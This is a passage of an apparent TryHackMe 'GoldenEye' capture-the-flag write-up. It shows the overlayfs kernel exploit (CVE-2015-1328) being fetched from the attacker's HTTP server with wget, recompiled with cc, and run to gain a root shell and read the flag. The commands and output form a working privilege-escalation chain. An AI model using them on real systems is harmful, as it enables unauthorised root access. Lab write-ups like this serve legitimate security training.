┌──(kali㉿kali)-[~/TryHackMe/GoldenEye]
└─$ searchsploit -m linux/local/37292.c
Exploit: Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation
URL: https://www.exploit-db.com/exploits/37292
Path: /usr/share/exploitdb/exploits/linux/local/37292.c
Codes: CVE-2015-1328
Verified: True
File Type: C source, ASCII text, with very long lines (466)
Copied to: /home/kali/TryHackMe/GoldenEye/37292.c

┌──(kali㉿kali)-[~/TryHackMe/GoldenEye]
└─$ ls -l 37292.c
-rw-r--r-- 1 kali kali 4968 Sep 3 12:29 37292.c

┌──(kali㉿kali)-[~/TryHackMe/GoldenEye]
└─$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

```

On target machine, using `wget` to get the exploit file:

```

<ditor/tinymce/tiny_mce/3.4.9/plugins/spellchecker$ wget http://10.9.63.75:8000/37292.c
<.9/plugins/spellchecker$ wget http://10.9.63.75:8000/37292.c
--2023-09-03 09:30:22-- http://10.9.63.75:8000/37292.c
Connecting to 10.9.63.75:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4968 (4.9K) [text/x-csrc]
Saving to: '37292.c'

     0K ....                                                  100% 5.50M=0.001s

2023-09-03 09:30:22 (5.50 MB/s) - '37292.c' saved [4968/4968]

<ditor/tinymce/tiny_mce/3.4.9/plugins/spellchecker$ ls -l 37292.c
ls -l 37292.c
-rw-rw-rw- 1 www-data www-data 4968 Sep 3 09:29 37292.c

```

You can read more details about the vulnerability and the exploit manual from this [page](https://www.exploit-db.com/exploits/37292) or from the file path `linux/local/37292.txt`.

Therefore, I try to use `gcc` on the target machine to compile the exploit script but it does not work:

```

<ditor/tinymce/tiny_mce/3.4.9/plugins/spellchecker$ gcc 37292.c -o exploit
gcc 37292.c -o exploit
The program 'gcc' is currently not installed. To run 'gcc' please ask your administrator to install the package 'gcc'

```

The `gcc` service is not available on the target system → I look for the similar one `cc` (C Compiler) which is an alias command to `gcc`

```

<ditor/tinymce/tiny_mce/3.4.9/plugins/spellchecker$ ls -l /usr/bin/ | grep "cc"
<.9/plugins/spellchecker$ ls -l /usr/bin/ | grep "cc"
lrwxrwxrwx 1 root root 20 Apr 28 2018 cc -> /etc/alternatives/cc
-rwxr-xr-x 1 root root 77 Mar 5 2014 pollycc

```

Then I have to replace all the `gcc` commands inside the exploit file using `sed`:

```

<ditor/tinymce/tiny_mce/3.4.9/plugins/spellchecker$ sed -i "s/gcc/cc/g" 37292.c

```

Which is actually change this line:

```c
lib = system("gcc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w");
```

To:

```c
lib = system("ccc -fPIC -shared -o /tmp/ofs-lib.so /tmp/ofs-lib.c -ldl -w");
```

Now I use `cc` to compile the file and name the output to _exploit_:

```
<ditor/tinymce/tiny_mce/3.4.9/plugins/spellchecker$ cc 37292.c -o exploit
cc 37292.c -o exploit
37292.c:94:1: warning: control may reach end of non-void function [-Wreturn-type]
}
^
37292.c:106:12: warning: implicit declaration of function 'unshare' is invalid in C99 [-Wimplicit-function-declaration]
        if(unshare(CLONE_NEWUSER) != 0)
           ^
37292.c:111:17: warning: implicit declaration of function 'clone' is invalid in C99 [-Wimplicit-function-declaration]
                clone(child_exec, child_stack + (1024*1024), clone_flags, NULL);
                ^
37292.c:117:13: warning: implicit declaration of function 'waitpid' is invalid in C99 [-Wimplicit-function-declaration]
            waitpid(pid, &status, 0);
            ^
37292.c:127:5: warning: implicit declaration of function 'wait' is invalid in C99 [-Wimplicit-function-declaration]
    wait(NULL);
    ^
5 warnings generated.
```

Don’t mind with the _warning_ lines and verify that the `37292.c` has been compiled successfully to `exploit`:

```
<ditor/tinymce/tiny_mce/3.4.9/plugins/spellchecker$ ls -l exploit
ls -l exploit
-rwxrwxrwx 1 www-data www-data 13773 Sep  3 09:50 exploit
```

The final step is execute the compiled payload and become **root** user:

```
<ditor/tinymce/tiny_mce/3.4.9/plugins/spellchecker$ ./exploit
./exploit
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
# whoami
whoami
root
# cat /root/root.txt
cat /root/root.txt
cat: /root/root.txt: No such file or directory
```

It’s a little bit tricky here that the flag is not usually in the `root.txt` file → I navigate to the `/root/` directory and looking for the flag:

```
# cd /root/
cd /root/
# ls -l
ls -l
total 0
# ls -la
ls -la
total 44
drwx------  3 root root 4096 Apr 29  2018 .
drwxr-xr-x 22 root root 4096 Apr 24  2018 ..
-rw-r--r--  1 root root   19 May  3  2018 .bash_history
-rw-r--r--  1 root root 3106 Feb 19  2014 .bashrc
drwx------  2 root root 4096 Apr 28  2018 .cache
-rw-------  1 root root  144 Apr 29  2018 .flag.txt
-rw-r--r--  1 root root  140 Feb 19  2014 .profile
-rw-------  1 root root 1024 Apr 23  2018 .rnd
-rw-------  1 root root 8296 Apr 29  2018 .viminfo
# cat .flag.txt
cat .flag.txt
Alec told me to place the codes here:

568628e0d993b1973adc718237da6e93

If you captured this make sure to go here.....
/006-final/xvf7-flag/
```

<p class="message">
✅ The answer: <strong>568628e0d993b1973adc718237da6e93</strong>

</p>
